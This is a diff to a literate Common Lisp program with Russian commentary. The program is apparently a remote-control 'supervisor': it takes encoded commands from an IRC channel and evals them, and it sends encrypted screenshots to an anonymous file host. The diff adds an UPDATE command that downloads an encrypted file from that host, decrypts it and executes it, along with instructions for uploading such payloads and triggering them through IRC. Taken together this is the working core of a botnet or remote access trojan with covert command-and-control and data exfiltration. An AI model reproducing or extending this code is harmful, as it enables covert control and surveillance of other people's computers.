@@ -101,6 +101,9 @@
   ;; irc
   <<irc>>
 
+  ;; update
+  <<update>>
+
   ;; shot
   <<shot>>
 
@@ -447,7 +450,7 @@ irc-канала. Она должна возвращать T чтобы пред
           (finish-output)
           (unless (null cmd)
             (setf *watchdog-timer* 0)
-            (let ((result (handler-case (bprint (eval (read-from-string  cmd)))
+            (let ((result (handler-case (bprint (eval (read-from-string cmd)))
                             (t (err)
                               (dbg "::irc-cmd error: ~A~%" (type-of err))
                               (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
@@ -458,7 +461,10 @@ irc-канала. Она должна возвращать T чтобы пред
               (finish-output)))))))
 
   ;; example of send encoded cmd
-  (encode "(print 1)" *irc-sess*)
+  ;; (encode "(print 1)" *irc-sess*)
+
+  ;; example of wrong encoded cmd
+  ;; (encode "(print 1)" (get-universal-time))
 #+END_SRC
 
 ** Sequence XOR
@@ -513,7 +519,7 @@ irc-канала. Она должна возвращать T чтобы пред
 
 ** Decode
 
-#+NAME:
+#+NAME: decode
 #+BEGIN_SRC lisp
 (defun decode (cmd seed)
   (multiple-value-bind (match-p result)
@@ -529,6 +535,59 @@ irc-канала. Она должна возвращать T чтобы пред
             (flex:octets-to-string oct :external-format :utf-8)
             ;; else
             nil)))))
+#+END_SRC
+
+* Update
+
+Чтобы удаленно расширять функциональность супервизора нам нужен способ
+обновить код. Это можно реализовать как выполнение команды ~UPDATE~,
+которая скачает файл с файлообменника и применит его к текущему образу.
+
+Для этого такой файл сначала нужно сформировать, загрузить и получить на
+него ссылку, например так:
+
+#+BEGIN_SRC lisp
+  (defun upload (code key)
+    (let* ((oct (flex:string-to-octets code :external-format :utf-8))
+           (base64 (encrypt oct key))
+           (filename (format nil "u-~A" (get-universal-time)))
+           (result   (cl-json:decode-json-from-string
+                      (anon-file-upload filename base64)))
+           (link     (if (cdr (assoc :status result))
+                         (subseq (cdadr (cadadr (assoc :data result))) 20)
+                         nil)))
+      link))
+
+  (upload "(print 1)" 1234567890)
+#+END_SRC
+
+После этого мы можем отправить команду вида:
+
+#+BEGIN_SRC lisp
+  (encode "(update \"/3444C7Dbna/u-3784602724\" 1234567890)" *irc-sess*)
+#+END_SRC
+
+Чтобы она сработала нужно определить функцию ~UPDATE~
+
+#+NAME: update
+#+BEGIN_SRC lisp :noweb yes
+  ;; anon_file_download
+  <<anon_file_download>>
+
+  (defun update (link key)
+    (let* ((base64 (anon-file-download link))
+           (oct    (decrypt base64 key))
+           (cmd    (flex:octets-to-string oct :external-format :utf-8))
+           (result (handler-case (bprint (eval (read-from-string cmd)))
+                     (t (err)
+                       (dbg "::irc-cmd error: ~A~%" (type-of err))
+                       (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
+                       (return-from update nil)))))
+      result))
+
+  ;; (update "/3444C7Dbna/u-3784602724" 1234567890)
+
+  ;; (update "/3444C7Dbna/u-3784602724" 1234567890)
 #+END_SRC
 
 * Snapshot function
@@ -679,8 +738,8 @@ irc-канал.
   ;; get_png_seq
   <<get_png_seq>>
 
-  ;; upload
-  <<upload>>
+  ;; anon_file_upload
+  <<anon_file_upload>>
 
   ;; wrap-img
   (defun wrap-img (frmt-filename-str dims image)
@@ -691,11 +750,13 @@ irc-канал.
            (base64   (encrypt png-seq *irc-sess*))
            (filename (format nil frmt-filename-str
                              (format nil "~A" (get-universal-time))))
+           (json     "")
            (result   (handler-case
-                         (cl-json:decode-json-from-string
-                          (anon-file-upload filename base64))
+                         (progn
+                           (setf json (anon-file-upload filename base64))
+                           (cl-json:decode-json-from-string json))
                        (JSON:JSON-SYNTAX-ERROR (err)
-                         (dbg "::wrap-img error: ~A~%" (type-of err))
+                         (dbg "::wrap-img error: ~A~%~A~%"  (type-of err) json)
                          (sendmsg "ERR(wrap-img): [~A]" (type-of err))
                          (return-from wrap-img nil))
                        (t (err)
@@ -745,9 +806,9 @@ irc-канал.
       (zpng:write-png-stream png stream)))
 #+END_SRC
 
-*** Upload
+*** Anon File Upload
 
-#+NAME: upload
+#+NAME: anon_file_upload
 #+BEGIN_SRC lisp
   ;; (setf drakma:*header-stream* *standard-output*)
 
@@ -1226,7 +1287,7 @@ irc-канал.
 
 ** Download
 
-#+NAME: download
+#+NAME: anon_file_download
 #+BEGIN_SRC lisp :noweb yes
   (defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")
 
@@ -1325,7 +1386,7 @@ irc-канал.
 
 #+NAME:
 #+BEGIN_SRC lisp
-  <<upload>>
+  <<anon_file_upload>>
   <<unpack_img>>
 
   (defun save-png (width height pathname-str image
